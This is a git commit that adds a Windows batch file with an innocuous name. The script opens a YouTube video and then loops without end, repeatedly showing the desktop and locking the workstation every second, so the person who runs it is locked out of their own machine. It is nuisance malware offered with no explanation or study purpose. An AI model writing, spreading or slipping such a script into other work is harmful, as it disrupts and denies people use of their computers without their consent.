ad062ab519e4d9b20e3faee2eff0287117e064a4
MαηiFαsт <62830326+ManiFast@users.noreply.github.com>
2022-04-10 18:48:01 +0500

    Add files via upload

---
+++ dsddsy.bat
@@ -0,0 +1,68 @@
+@echo off
+
+color 05
+
+:UP
+
+start chrome https://www.youtube.com/watch?v=jMBsK5BxTaw
+timeout 4
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+
+
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+Rundll32.exe user32.dll,LockWorkStation
+"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
+timeout 1
+
+timeout 5
+GOTO UP
+
+pause
+exit
